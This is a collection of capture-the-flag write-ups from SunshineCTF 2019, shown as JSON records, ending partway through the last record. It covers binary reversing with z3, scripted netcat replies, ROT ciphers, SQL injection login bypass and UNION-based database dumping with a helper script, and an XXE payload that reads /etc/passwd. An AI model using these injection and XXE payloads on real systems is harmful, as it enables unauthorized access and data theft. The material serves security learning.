{"source": "github", "repo": "Dvd848/CTFs", "file": "2019_SunshineCTF/Smash.md", "url": "https://github.com/Dvd848/CTFs/blob/master/2019_SunshineCTF/Smash.md", "content": "# Smash\r\nReversing, 150 points\r\n\r\n## Description\r\n\r\n> We discovered this old CD from the 90s in our attic. It looks like it used to register you to a WWE betting community back in the day, but we seem to have lost the access code. Can you get us in?\r\n\r\nA binary file was attached.\r\n\r\n## Solution\r\n\r\nLet's run the binary:\r\n\r\n```console\r\nroot@kali:/media/sf_CTFs/sunshine/Smash# ./WrestleOfMania\r\nWRESTLE-O-MANIA! We bring your wrestling bets to the internet.\r\nAll rights reserved, 1991.\r\nBeginning your installation.....\r\n\r\nPlease enter your access code: test\r\nERROR: Access code invalid.\r\n```\r\n\r\nLooks like we'll have to provide a valid access code in order to proceed.\r\n\r\nLet's take a look at the Ghidra decompilation output (function names were included, all other labels and types are user-defined):\r\n\r\n```c\r\nundefined4 main(undefined1 param_1)\r\n\r\n{\r\n  char *pcVar1;\r\n  uint uVar2;\r\n  undefined4 uVar3;\r\n  char user_key [31];\r\n  int local_14;\r\n  \r\n  puts(\"WRESTLE-O-MANIA! We bring your wrestling bets to the internet.\");\r\n  puts(\"All rights reserved, 1991.\");\r\n  printf(\"Beginning your installation\");\r\n  fflush(stdout);\r\n  local_14 = 0;\r\n  while (local_14 < 5) {\r\n    putchar('.');\r\n    fflush(stdout);\r\n    local_14 = local_14 + 1;\r\n  }\r\n  printf(\"\\n\\nPlease enter your access code: \");\r\n  pcVar1 = fgets(user_key,31,stdin);\r\n  if (pcVar1 == (char *)0x0) {\r\n    puts(\"ERROR: Access code not recognized.\");\r\n    uVar3 = 0xffffffff;\r\n  }\r\n  else {\r\n    uVar2 = checkAccessCode(user_key);\r\n    if (uVar2 == 1) {\r\n      puts(\"Thank you for registering!\");\r\n    }\r\n    else {\r\n      puts(\"ERROR: Access code invalid.\");\r\n    }\r\n    uVar3 = 0;\r\n  }\r\n  return uVar3;\r\n}\r\n```\r\n\r\nThe important logic resides in `checkAccessCode()`, let's inspect it:\r\n```c\r\nuint checkAccessCode(char *user_key)\r\n\r\n{\r\n  int iVar1;\r\n  int *p_out_arr;\r\n  int in_arr [30];\r\n  int verify_res;\r\n  \r\n  __x86.get_pc_thunk.ax();\r\n  in_arr[0] = 5;\r\n  in_arr[1] = 3;\r\n  in_arr[2] = 6;\r\n  in_arr[3] = 5;\r\n  in_arr[4] = 2;\r\n  in_arr[5] = 5;\r\n  in_arr[6] = 3;\r\n  in_arr[7] = 3;\r\n  in_arr[8] = 3;\r\n  in_arr[9] = 5;\r\n  in_arr[10] = 2;\r\n  in_arr[11] = 4;\r\n  in_arr[12] = 6;\r\n  in_arr[13] = 5;\r\n  in_arr[14] = 5;\r\n  in_arr[15] = 2;\r\n  in_arr[16] = 2;\r\n  in_arr[17] = 5;\r\n  in_arr[18] = 2;\r\n  in_arr[19] = 6;\r\n  in_arr[20] = 5;\r\n  in_arr[21] = 1;\r\n  in_arr[22] = 3;\r\n  in_arr[23] = 4;\r\n  in_arr[24] = 5;\r\n  in_arr[25] = 3;\r\n  in_arr[26] = 4;\r\n  in_arr[27] = 6;\r\n  in_arr[28] = 6;\r\n  in_arr[29] = 5;\r\n  process(user_key,in_arr,&p_out_arr);\r\n  prepare(user_key);\r\n  verify(user_key);\r\n  format(user_key,&p_out_arr);\r\n  iVar1 = checkResult(p_out_arr);\r\n  return (uint)(iVar1 == 1);\r\n}\r\n```\r\n\r\nThis function defines an array, then calls a series of functions.\r\n\r\nLet's inspect them one by one:\r\n\r\n```c\r\nvoid process(char *user_key,int *in_arr,int **pp_out_arr)\r\n\r\n{\r\n  int *piVar1;\r\n  int i;\r\n  \r\n  __x86.get_pc_thunk.ax();\r\n  piVar1 = (int *)malloc(120);\r\n  *pp_out_arr = piVar1;\r\n  i = 0;\r\n  while (i < 30) {\r\n    (*pp_out_arr)[i] = 0;\r\n    i = i + 1;\r\n  }\r\n  i = 0;\r\n  while (i < 30) {\r\n    while (in_arr[i] != 0) {\r\n      (*pp_out_arr)[i] = (*pp_out_arr)[i] + 1;\r\n      in_arr[i] = in_arr[i] + -1;\r\n    }\r\n    i = i + 1;\r\n  }\r\n  return;\r\n}\r\n```\r\n\r\nThis function allocates `out_arr` (an array of 30 integers) and copies `in_arr` to `out_arr`.\r\n\r\n```c\r\nvoid prepare(char *user_key)\r\n\r\n{\r\n  FILE *__s;\r\n  int i;\r\n  \r\n  __s = fopen(\"/dev/null\",\"w\");\r\n  i = 0;\r\n  while( true ) {\r\n    if (29 < i) {\r\n      return;\r\n    }\r\n    if ((int)user_key[i] - 'n'U < 16) break;\r\n    fwrite(\"there\",1,5,__s);\r\n    i = i + 1;\r\n  }\r\n                    /* WARNING: Could not recover jumptable at 0x000108f1. Too many branches */\r\n                    /* WARNING: Treating indirect jump as call */\r\n  (*(code *)((int)&_GLOBAL_OFFSET_TABLE_ + *(int *)(&UNK_00010d94 + ((int)user_key[i] - 'n'U) * 4)))\r\n            ();\r\n  return;\r\n}\r\n```\r\n\r\nThis looks like a dummy function, it doesn't modify the input or do anything else which seems meaningful. Hopefully we can ignore it.\r\n\r\n```c\r\nint verify(char *user_key)\r\n\r\n{\r\n  int j;\r\n  uint local_c;\r\n  int i;\r\n  \r\n  __x86.get_pc_thunk.ax();\r\n  i = 0;\r\n  local_c = 5;\r\n  j = 25;\r\n  while (j != 0) {\r\n    if (user_key[i] == '-') {\r\n      local_c = local_c & 3;\r\n    }\r\n    i = i + 1;\r\n    j = j + -1;\r\n  }\r\n  return (uint)(local_c != 92);\r\n}\r\n```\r\n\r\nThis function performs some kind of verification on the input, but the return value is ignored. Hopefully we can ignore it as well.\r\n\r\n```c\r\nvoid format(char *user_key,int **pp_out_arr)\r\n\r\n{\r\n  void *__ptr;\r\n  int i;\r\n  \r\n  __ptr = malloc(120);\r\n  i = 0;\r\n  while (i < 30) {\r\n    (*pp_out_arr)[i] = (int)user_key[i] << ((byte)(*pp_out_arr)[i] & 0x1f);\r\n    i = i + 1;\r\n  }\r\n  free(__ptr);\r\n  return;\r\n}\r\n```\r\n\r\nThis function formats `out_arr` using the user key - this seems important.\r\n\r\n```c\r\nundefined4 checkResult(int *p_out_arr)\r\n\r\n{\r\n  int j;\r\n  int *piVar1;\r\n  int *piVar2;\r\n  int expected_arr [30];\r\n  int i;\r\n  \r\n  j = 30;\r\n  piVar1 = g_expected_values;\r\n  piVar2 = expected_arr;\r\n  while (j != 0) {\r\n    j = j + -1;\r\n    *piVar2 = *piVar1;\r\n    piVar1 = piVar1 + 1;\r\n    piVar2 = piVar2 + 1;\r\n  }\r\n  i = 0;\r\n  while( true ) {\r\n    if (29 < i) {\r\n      return 1;\r\n    }\r\n    if (expected_arr[i] != p_out_arr[i]) break;\r\n    i = i + 1;\r\n  }\r\n  return 0;\r\n}\r\n```\r\n\r\nFinally, this function checks if the formatted `out_arr` is identical to a global `g_expected_values`:\r\n\r\n```\r\n                             g_expected_values                               XREF[2]:     checkResult:000109af(*), \r\n                                                                                          checkResult:000109be(R)  \r\n        00010de0 60 0e 00 00        int[30]\r\n                 a8 03 00 00 \r\n                 80 1b 00 00 \r\n           00010de0 [0]                    E60h,         3A8h,        1B80h,         F60h\r\n           00010df0 [4]                    120h,         EA0h,         188h,         358h\r\n           00010e00 [8]                    1A0h,         9A0h,         184h,         4E0h\r\n           00010e10 [12]                   C40h,         C20h,         5A0h,         1C8h\r\n           00010e20 [16]                   1D4h,         9C0h,         1CCh,         B40h\r\n           00010e30 [20]                   AE0h,          62h,         360h,         340h\r\n           00010e40 [24]                   5A0h,         180h,         6E0h,         B40h\r\n           00010e50 [28]                  1540h,         FA0h\r\n\r\n```\r\n\r\nNow that we have the important logic, we can use z3 to find a key that complies with it (even though the logic doesn't seem to hard to reverse manually):\r\n\r\n```python\r\nfrom z3 import *\r\n\r\nKEY_LEN = 30\r\nkey = [BitVec(\"{}\".format(i), 32) for i in range(KEY_LEN)]\r\nsolver = Solver()\r\n\r\nfor i in range(KEY_LEN):\r\n    solver.add(key[i] >= ord('!'))\r\n    solver.add(key[i] <= ord('~'))\r\n\r\nin_arr = [5, 3, 6, 5, 2, 5, 3, 3, 3, 5, 2, 4, 6, 5, 5, 2, 2, 5, 2, 6, 5, 1, 3, 4, 5, 3, 4, 6, 6, 5]\r\n\r\nfor i in range(len(in_arr)):\r\n    in_arr[i] = key[i] << (in_arr[i] & 0x1f)\r\n\r\nexpected_arr = [0xE60,         0x3A8,         0x1B80,        0xF60,\r\n                0x120,         0xEA0,         0x188,         0x358,\r\n                0x1A0,         0x9A0,         0x184,         0x4E0,\r\n                0xC40,         0xC20,         0x5A0,         0x1C8,\r\n                0x1D4,         0x9C0,         0x1CC,         0xB40,\r\n                0xAE0,         0x62,          0x360,         0x340,\r\n                0x5A0,         0x180,         0x6E0,         0xB40,\r\n                0x1540,        0xFA0]\r\n\r\nfor i in range(len(expected_arr)):\r\n    solver.add(expected_arr[i] == in_arr[i])\r\n\r\nif solver.check() == sat:\r\n    model = solver.model()\r\n    #print(model)\r\n\r\n    res = \"\"\r\n    for i in range(KEY_LEN):\r\n        res += chr(model[key[i]].as_long())\r\n    print res\r\n```\r\n\r\nThe output:\r\n\r\n```console\r\nroot@kali:/media/sf_CTFs/sunshine/Smash# python solve.py\r\nsun{Hu1k4MaN1a-ruNs-W1l4-0n-U}\r\nroot@kali:/media/sf_CTFs/sunshine/Smash# python solve.py | ./WrestleOfMania\r\nWRESTLE-O-MANIA! We bring your wrestling bets to the internet.\r\nAll rights reserved, 1991.\r\nBeginning your installation.....\r\n\r\nPlease enter your access code: Thank you for registering!\r\n```\r\n\r\nThe flag: sun{Hu1k4MaN1a-ruNs-W1l4-0n-U}", "timestamp": "2025-10-21T13:36:22.924897"}
{"source": "github", "repo": "Dvd848/CTFs", "file": "2019_SunshineCTF/TimeWarp.md", "url": "https://github.com/Dvd848/CTFs/blob/master/2019_SunshineCTF/TimeWarp.md", "content": "# TimeWarp\r\nScripting, 50 points\r\n\r\n## Description\r\n\r\n> Oh no! A t3mp0ral anoma1y has di5rup7ed the timeline! Y0u'll have to 4nswer the qu3stion5 before we ask them!\r\n\r\n## Solution\r\n\r\nWe connect to the service and get the following output:\r\n\r\n```console\r\nroot@kali:/media/sf_CTFs/sunshine/TimeWarp# nc archive.sunshinectf.org 19004\r\nI'm going to give you some numbers between 0 and 999.\r\nRepeat them back to me in 30 seconds or less!\r\n```\r\n\r\nIf we guess a number, we get the correct number as output:\r\n```console\r\nroot@kali:/media/sf_CTFs/sunshine/TimeWarp# nc archive.sunshinectf.org 19004\r\nI'm going to give you some numbers between 0 and 999.\r\nRepeat them back to me in 30 seconds or less!\r\n1\r\n39\r\nG3tting c0lder!\r\n```\r\n\r\nWe can use that to proceed by opening a new session:\r\n```console\r\nroot@kali:/media/sf_CTFs/sunshine/TimeWarp# nc archive.sunshinectf.org 19004\r\nI'm going to give you some numbers between 0 and 999.\r\nRepeat them back to me in 30 seconds or less!\r\n39\r\n39\r\nIcr3dible!\r\n1\r\n61\r\n00f, th4t can't b3 g00d!\r\n```\r\n\r\nAt first I tried the following pwntools script, but it was too slow:\r\n```python\r\nfrom pwn import *\r\nimport time\r\n\r\ndef get_next_number(num_list):\r\n    log.info(\"Starting to send new list of length {}\".format(len(num_list)))\r\n    with context.local(log_level='DEBUG'):\r\n        r = remote(\"archive.sunshinectf.org\", 19004)\r\n        r.recvuntil(\"Repeat them back to me in 30 seconds or less!\\n\")\r\n        for n in num_list:\r\n            log.info(\"Sending {}\".format(n))\r\n            r.sendline(n)\r\n            out = r.recvline()\r\n            out += r.recvline()\r\n            if \"sun{\" in out:\r\n                print out\r\n                return None\r\n        r.sendline(\"1000\")\r\n        new_num = r.recvline()\r\n        r.recvall()\r\n        return new_num.rstrip()\r\n\r\nnum_list = []\r\nwhile True:\r\n    new_num = get_next_number(num_list)\r\n    if new_num is None:\r\n        break\r\n    num_list.append(new_num)\r\n    print num_list\r\n    time.sleep(0.3)\r\n```\r\n\r\nThe following bash script did the trick:\r\n\r\n```bash\r\n#!/bin/bash\r\n\r\noutput=\"\"\r\nnumbers=()\r\n\r\nwhile [[ ${output} != *\"sun\"* ]]; do\r\n    output=$((printf '%s\\n' \"${numbers[@]}\"; echo \"9999\") | nc archive.sunshinectf.org 19004)\r\n    new_num=$(echo \"$output\" | tail -2 | egrep -x '[0-9]+')\r\n    echo -n \"$new_num \"\r\n    numbers+=(\"$new_num\")\r\n    #echo list: ${numbers[*]}\r\ndone\r\n\r\necho \"\"\r\necho \"$output\" | grep sun\r\n```\r\n\r\nOutput:\r\n```console\r\nroot@kali:/media/sf_CTFs/sunshine/TimeWarp# ./solve.sh\r\n39 61 267 475 178 760 660 257 897 994 610 639 813 495 832 647 228 74 474 215 523 905 65 741 814 742 787 58 917 548 465 309 609 733 784 140 493 444 397 391 790 359 382 956 854 566 603 435 640 429 650 163 335 716 256 149 458 396 559 375 944 24 684 905 757 820 397 251 264 794 994 407 506 728 363 360 294 318 795 286 747 446 801 434 514 410 935 972 806 494 699 102 519 736 359 276 908 757 879 525 903 225 932 409 953 647 122 599 965 917 237 712 363 39 147 877 801 82 201 607 929 253 61 448 341 772 724 249 529 604 774 785 181 58 546 135 705 668 86 670 586 324 735 301 715 234 531 516 316 732 123 245 337 536 45 678 308 770 280 190 726 406 975 907 465 521 394 170 190 481 841 128 805 576 429 520 162 960 36 478 45 511 76 382 399 473 413 707 243 693 897 321 99 224 581 916 98 975 87 288 456 280 416 613 208 197 485 370 158 873 200 203 384 628 937 135 102 350 843 697 395 92 19 847 669 600 763 767 927 202 55 736 482 823 701 690 20 187 60 530 60 613 85 797 241 23 932 343 725 127 41 121 220 412 320 241 364 83 8 291 286 63 379 120 238 81 811 610 268 223 141 680 836 226 477 430 249 762 773 975 889 166 448 461 930 768 702 646 203 710 938 841 125 669 962 715 750 773 326 370  \r\nsun{derotser_enilemit_1001131519}\r\n```", "timestamp": "2025-10-21T13:36:23.033898"}
{"source": "github", "repo": "Dvd848/CTFs", "file": "2019_SunshineCTF/WelcomeCrypto.md", "url": "https://github.com/Dvd848/CTFs/blob/master/2019_SunshineCTF/WelcomeCrypto.md", "content": "# CB1\r\nCrypto, 50 points\r\n\r\n## Description\r\n\r\n> ~C8 =39 A?2V8 73J:C 8FG7 AF?JJC2ECP\r\n> \r\n> DF?LHb=r_>b0%_0520<c8bPN\r\n\r\n\r\n## Solution\r\n\r\nWe'll use the same script from [CB1](CB1.md) to try and guess the solution using ROT and frequency analysis.\r\n\r\nIf we use the script and attempt to guess the solution for the complete text, we get:\r\n```\r\nroot@kali:/media/sf_CTFs/sunshine/WelcomeCrypto# python3 ../CB1/rot.py -i ciphertext.txt -g\r\n1TI NDJ RPCgI HD[KT IWXH RWP[[TCVTa\r\n\r\nUWP]YsN%pOsA6pAFCAMtIsa_\r\n```\r\n\r\nNot close.\r\n\r\nBut - if we take the first line and try to guess the solution, we get:\r\n\r\n```console\r\nroot@kali:/media/sf_CTFs/sunshine/WelcomeCrypto# python3 ../CB1/rot.py -s \"$(head ciphertext.txt -n 1)\" -g\r\nOrg lbh pna'g fbyir guvf punyyratr!\r\n```\r\n\r\nThis looks like a good direction. What if we perform another guessing cycle?\r\n\r\n```console\r\nroot@kali:/media/sf_CTFs/sunshine/WelcomeCrypto# python3 ../CB1/rot.py -s \"$(head ciphertext.txt -n 1)\" -g | python3 ../CB1/rot.py -i -g\r\nBet you can't solve this challenge!\r\n```\r\n\r\nThis doesn't work on the second line though. There, the answer is just ROT47:\r\n```console\r\nroot@kali:/media/sf_CTFs/sunshine/WelcomeCrypto# python3 ../CB1/rot.py -s \"$(tail ciphertext.txt -n 1)\" --rot47_n 47\r\nsun{w3lC0m3_T0_da_k4g3!}\r\n```", "timestamp": "2025-10-21T13:36:23.130089"}
{"source": "github", "repo": "Dvd848/CTFs", "file": "2019_SunshineCTF/WrestlerBook.md", "url": "https://github.com/Dvd848/CTFs/blob/master/2019_SunshineCTF/WrestlerBook.md", "content": "# WrestlerBook\r\nWeb, 100 points\r\n\r\n## Description\r\n\r\n> WrestlerBook is the social network for wrestlers, by wrestlers. WrestlerBook is exclusively for wrestlers, so if you didn't get an invite don't even bother trying to view our profiles.\r\n\r\n\r\n## Solution\r\n\r\nWe visit the attached site and see a login page:\r\n\r\n```html\r\n<div class=\"login-form\">\r\n    <form action=\"login.php\" method=\"post\">\r\n        <h2 class=\"text-center\">Log in</h2>\r\n        <div class=\"form-group\">\r\n            <input type=\"text\" name=\"username\" class=\"form-control\" placeholder=\"Username\" required=\"required\">\r\n        </div>\r\n        <div class=\"form-group\">\r\n            <input type=\"password\" name=\"password\" class=\"form-control\" placeholder=\"Password\" required=\"required\">\r\n        </div>\r\n        <div class=\"form-group\">\r\n            <button type=\"submit\" class=\"btn btn-primary btn-block\">Log in</button>\r\n        </div>\r\n        <div class=\"clearfix\">\r\n        </div>\r\n    </form>\r\n</div>\r\n```\r\n\r\nIf we try to enter an apostrophe as the password, we get an SQL error:\r\n```console\r\nroot@kali:/media/sf_CTFs/sunshine/WrestlerBook# curl http://archive.sunshinectf.org:19006/login.php -X POST --data \"username=a&password='\"\r\n<br />\r\n<b>Warning</b>:  SQLite3::query(): Unable to prepare statement: 1, unrecognized token: &quot;'''&quot; in <b>/var/www/html/login.php</b> on line <b>20</b><br />\r\n<br />\r\n<b>Fatal error</b>:  Uncaught Error: Call to a member function fetchArray() on boolean in /var/www/html/login.php:21\r\nStack trace:\r\n#0 {main}\r\n  thrown in <b>/var/www/html/login.php</b> on line <b>21</b><br />\r\n```\r\n\r\nThis means that the site is vulnerable to SQL injection.\r\n\r\nWe can try to bypass the login test by using **`' or 1=1--`** as the password:\r\n```console\r\nroot@kali:/media/sf_CTFs/sunshine/WrestlerBook# curl http://archive.sunshinectf.org:19006/login.php -X POST --data \"username=a&password=' or 1=1--\"\r\n```\r\n\r\nin response, we arrive to a page with details about a wrestler (Hulk Hogan):\r\n```html\r\n<div class=\"info\">\r\n    <div class=\"title\">\r\n        <a target=\"_blank\"> Hulk Hogan </a>\r\n    </div>\r\n    <div class=\"desc\">Username: hulkhogie</div>\r\n    <div class=\"desc\">Age: 65</div>\r\n    <div class=\"desc\">Title:  WWF World Heavyweight Champion</div>\r\n    <div class=\"desc\">Flag: N/A</div>\r\n</div>\r\n```\r\n\r\n`SQLMap` can easily dump the database, but let's try doing in manually this time.\r\n\r\nWe know that the engine is SQLite from the original error message we saw. Let's try to create a UNION statement that will allow us to extract information from the DB.\r\n\r\nSQLite has a `sqlite_master` table which holds information about the other tables. We can use it to extract table names and column names. However, first we have to arrive to a query which will have a legal syntax and let us extract the information we want.\r\n\r\nWe start with a simple union:\r\n\r\n```console\r\nroot@kali:/media/sf_CTFs/sunshine/WrestlerBook# curl http://archive.sunshinectf.org:19006/login.php -X POST --data \"username=a&password=a' UNION select 1 from sqlite_master--\"\r\n<br />\r\n<b>Warning</b>:  SQLite3::query(): Unable to prepare statement: 1, SELECTs to the left and right of UNION do not have the same number of result columns in <b>/var/www/html/login.php</b> on line <b>20</b><br />\r\n<br />\r\n<b>Fatal error</b>:  Uncaught Error: Call to a member function fetchArray() on boolean in /var/www/html/login.php:21\r\nStack trace:\r\n#0 {main}\r\n  thrown in <b>/var/www/html/login.php</b> on line <b>21</b><br />\r\n```\r\n\r\nThe error message we get tells us that the SELECTs on both sides of the UNION need to have the same amount of result columns. We increase the amount and try again until arriving to 8 column:\r\n\r\n```console\r\nroot@kali:/media/sf_CTFs/sunshine/WrestlerBook# curl http://archive.sunshinectf.org:19006/login.php -X POST --data \"username=a&password=a' UNION select 1,2,3,4,5,6,7,8 from s\r\nqlite_master--\"\r\n...\r\n                <div class=\"avatar\">\r\n                    <img alt=\"\" src=\"3\">\r\n                </div>\r\n                <div class=\"info\">\r\n                    <div class=\"title\">\r\n                        <a target=\"_blank\"> 5 </a>\r\n                    </div>\r\n                    <div class=\"desc\">Username: 1</div>\r\n                    <div class=\"desc\">Age: 4</div>\r\n                    <div class=\"desc\">Title: 6</div>\r\n                    <div class=\"desc\">Flag: 7</div>\r\n                </div>\r\n```\r\n\r\nNow we are starting to see data from our query in the page result.\r\n\r\nWe can use the following Python script for easy trial & error:\r\n\r\n```python\r\nimport re\r\nimport html\r\nimport requests\r\nfrom cmd import Cmd\r\n\r\n\r\nclass MyPrompt(Cmd):\r\n   def do_exit(self, inp):\r\n        return True\r\n \r\n   def do_send(self, param):\r\n        q = \"a' UNION {}--\".format(param)\r\n        r = requests.post('http://archive.sunshinectf.org:19006/login.php', data = {'username':\"a\", 'password': q})\r\n        if \"Fatal error\" in r.text:\r\n            print (r.text)\r\n        else:\r\n            m = re.search(\"<a target=\\\"_blank\\\">\\s+(.+)\\s+</a>\", r.text)\r\n            if m:\r\n                print (html.unescape(m.group(1)))\r\n            else:\r\n                print(r.text)\r\n \r\nMyPrompt().cmdloop()\r\n```\r\n\r\nThis script lets us send queries in a mini-console, and extracts the output for easy viewing:\r\n\r\n```console\r\n(Cmd) send SELECT 1,2,3,4,name,6,7,8  FROM sqlite_master WHERE type='table' limit 0,1\r\nsqlite_sequence\r\n(Cmd) send SELECT 1,2,3,4,name,6,7,8  FROM sqlite_master WHERE type='table' limit 1,1\r\nusers\r\n(Cmd) send SELECT 1,2,3,4,sql,6,7,8  FROM sqlite_master WHERE type='table' limit 0,1\r\nCREATE TABLE `users` (\r\n        `username`      TEXT,\r\n        `password`      TEXT,\r\n        `avatar`        TEXT,\r\n        `age`   INTEGER,\r\n        `name`  TEXT,\r\n        `title` TEXT,\r\n        `flag`  TEXT,\r\n        `id`    INTEGER PRIMARY KEY AUTOINCREMENT\r\n)\r\n(Cmd) send SELECT 1,2,3,4,flag,6,7,8  FROM users WHERE length(flag) > 0 limit 0,1\r\nN/A\r\n(Cmd) send SELECT 1,2,3,4,flag,6,7,8  FROM users WHERE flag != \"N/A\" limit 0,1\r\nexample_flag\r\n(Cmd) send SELECT 1,2,3,4,flag,6,7,8  FROM users WHERE flag != \"N/A\" limit 1,1\r\nsun{ju57_4n07h3r_5ql1_ch4ll}\r\n```", "timestamp": "2025-10-21T13:36:23.227077"}
{"source": "github", "repo": "Dvd848/CTFs", "file": "2019_SunshineCTF/Wrestler_Name_Generator.md", "url": "https://github.com/Dvd848/CTFs/blob/master/2019_SunshineCTF/Wrestler_Name_Generator.md", "content": "# Wrestler Name Generator\r\nWeb, 150 points\r\n\r\n## Description\r\n\r\n> Even better than the Wu-Tang name generator, legend has it that Hulk Hogan used this app to get his name.\r\n\r\n\r\n## Solution\r\n\r\nWe visit the attaches site and see a form:\r\n\r\n```html\r\n<form>\r\n  <div class=\"form-group\">\r\n    <label style=\"color:white\" for=\"exampleFormControlInput1\">First Name</label>\r\n    <input type=\"email\" class=\"form-control\" id=\"firstName\" placeholder=\"First\">\r\n  </div>\r\n  <div class=\"form-group\">\r\n    <label style=\"color:white\" for=\"exampleFormControlInput1\">Last Name</label>\r\n    <input type=\"email\" class=\"form-control\" id=\"lastName\" placeholder=\"Last\">\r\n  </div>\r\n  <div class=\"form-group\">\r\n    <label style=\"color:white\" for=\"exampleFormControlSelect1\">Weapon of Choice</label>\r\n    <select class=\"form-control\" id=\"weapon\">\r\n      <option>Steel Chair</option>\r\n      <option>Flaming Table</option>\r\n      <option>Barb Wire Bat</option>\r\n      <option>Ladder</option>\r\n      <option>Thumbtacks</option>\r\n    </select>\r\n  </div>\r\n</form>\r\n```\r\n\r\nSubmitting the form triggers the following script:\r\n\r\n```html\r\n<script>\r\ndocument.getElementById(\"button\").onclick = function() {\r\n  var firstName = document.getElementById(\"firstName\").value;\r\n  var lastName = document.getElementById(\"lastName\").value;\r\n  var input = btoa(\"<?xml version='1.0' encoding='UTF-8'?><input><firstName>\" + firstName + \"</firstName><lastName>\" + lastName+ \"</lastName></input>\");\r\n  window.location.href = \"/generate.php?input=\"+encodeURIComponent(input);\r\n};\r\n</script>\r\n```\r\n\r\nThe form input is translated to XML. This method might be vulnerable to XXE.\r\n\r\n> An XML External Entity attack is a type of attack against an application that parses XML input and allows XML entities. XML entities can be used to tell the XML parser to fetch specific content on the server.\r\n\r\nLet's perform a simple proof of concept, taken from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection).\r\n\r\nWe try to send the following XML:\r\n\r\n```xml\r\n<?xml version=\"1.0\" ?>\r\n<!DOCTYPE replace [<!ENTITY example \"Doe\"> ]>\r\n<input>\r\n    <firstName>John</firstName>\r\n    <lastName>&example;</lastName>\r\n</input>\r\n```\r\n\r\nIf the service is vulnerable to XXE, the result will return as \"John Doe\".\r\n\r\n```console\r\nroot@kali:/media/sf_CTFs/sunshine/Wrestler_Name_Generator# echo '<?xml version=\"1.0\" ?><!DOCTYPE replace [<!ENTITY example \"Doe\"> ]><input><firstName>John</firstName><lastName>&example;</lastName></input>' | base64 -w 0 | curl -G \"http://archive.sunshinectf.org:19007/generate.php\" --data-urlencode \"input=$(</dev/stdin)\"\r\n<!DOCTYPE html>\r\n<html lang=\"en\">\r\n<head>\r\n  <title>Wrestler Name Generator</title>\r\n  <meta charset=\"utf-8\">\r\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\r\n  <link rel=\"stylesheet\" href=\"https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css\">\r\n  <script src=\"https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js\"></script>\r\n  <script src=\"https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js\"></script>\r\n  <script src=\"https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js\"></script>\r\n</head>\r\n<body>\r\n\r\n<div class=\"jumbotron text-center\">\r\n  <h1>Your Wrestler Name Is:</h1>\r\n  <h2>John \"The Ferocious\" Doe</h2>\r\n<!--hacker name functionality coming soon!-->\r\n<!--if you're trying to test the hacker name functionality, make sure you're accessing this page from the web server-->\r\n<!--<h2>Your Hacker Name Is: REDACTED</h2>-->\r\n  <a href=\"/\">Go Back</a>\r\n</div>\r\n</body>\r\n</html>\r\n```\r\n\r\nIt worked!\r\n\r\nLet's try reading a file from the server:\r\n```console\r\nroot@kali:/media/sf_CTFs/sunshine/Wrestler_Name_Generator# cat << TEXT  | base64 -w 0 | curl -G \"http://archive.sunshinectf.org:19007/generate.php\" --data-urlencode \"input=$(</dev/stdin)\"\r\n<?xml version=\"1.0\"?>\r\n<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>\r\n<input><firstName>John</firstName><lastName>&test;</lastName></input>\r\nTEXT\r\n<!DOCTYPE html>\r\n<html lang=\"en\">\r\n<head>\r\n  <title>Wrestler Name Generator</title>\r\n  <meta charset=\"utf-8\">\r\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\r\n  <link rel=\"stylesheet\" href=\"https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css\">\r\n  <script src=\"https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js\"></script>\r\n  <script src=\"https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js\"></script>\r\n  <script src=\"https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js\"></script>\r\n</head>\r\n<body>\r\n\r\n<div class=\"jumbotron text-center\">\r\n  <h1>Your Wrestler Name Is:</h1>\r\n  <h2>John \"The Slasher\" root:x:0:0:root:/root:/bin/bash\r\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\r\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\r\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\r\nsync:x:4:65534:sync:/bin:/bin/sync\r\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\r\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\r\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\r\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\r\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\r\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\r\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\r\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\r\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\r\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\r\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\r\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\r\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\r\n_apt:x:100:65534::/nonexistent:/bin/false\r\n</h2>\r\n<!--hacker name functionality coming soon!-->\r\n<!--if you're trying to test the hacker name functionality, make sure you're accessing this page from the web server-->\r\n<!--<h2>Your Hacker Name Is: REDACTED</h2>-->\r\n  <a href=\"/\">Go Back</a>\r\n</div>\r\n</body>\r\n</html>\r\n```\r\n\r\nLooks good, we are able to read files.\r\n\r\nWhat happens if we enter bad input?\r\n```console\r\nroot@kali:/media/sf_CTFs/sunshine/Wrestler_Name_Generator# cat << TEXT  | base64 -w 0 | curl -G \"http://archive.sunshinectf.org:19007/generate.php\" --data-urlencode \"input=$(</dev/stdin)\"\r\nbad input\r\nTEXT\r\n\r\n<br />\r\n<b>Warning</b>:  simplexml_load_string(): Entity: line 1: parser error : Start tag expected, '&lt;' not found in <b>/var/www/html/generate.php</b> on line <b>23</b><br />\r\n<br />\r\n<b>Warning</b>:  